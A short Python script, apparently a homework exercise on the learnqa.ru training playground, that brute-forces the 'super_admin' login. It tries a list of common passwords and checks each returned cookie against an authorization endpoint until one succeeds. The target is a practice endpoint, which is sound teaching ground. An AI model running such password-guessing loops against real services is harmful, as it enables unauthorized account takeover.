import requests

URL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"

URL_Auth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

passwords = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "111111", "iloveyou", "master", "sunshine",
    "ashley", "bailey", "passw0rd", "shadow", "123123",
    "654321", "superman", "qazwsx", "michael", "Football",
    "12345", "1234", "123456789", "football", "1234567890",
    "princess", "login", "welcome", "solo", "abc123",
    "admin", "1qaz2wsx", "121212", "flower", "loveme",
    "hottie", "zaq1zaq1", "password1", "starwars", "000000",
    "photoshop", "adobe123", "azerty", "access", "mustang",
    "batman", "696969", "jesus", "ninja", "1q2w3e4r",
    "qwerty123", "qwertyuiop", "1234567", "123qwe", "555555",
    "lovely", "7777777", "888888", "aa123456", "charlie",
    "donald", "freedom", "hello", "whatever", "666666",
    "!@#$%^&*"
]

for i, passwd in enumerate(passwords):
     print(i)
     datareq = {"login":"super_admin", "password": passwd }
     response = requests.post(URL, data = datareq)
     print(response.text)
     auth_cookie = dict(response.cookies)
     response_auth = requests.post(URL_Auth, cookies = auth_cookie)
     print(response_auth.text)
     if response_auth.text == 'You are authorized':
        print(f"Мы нашли пароль! Это '{passwd}'!")
        break


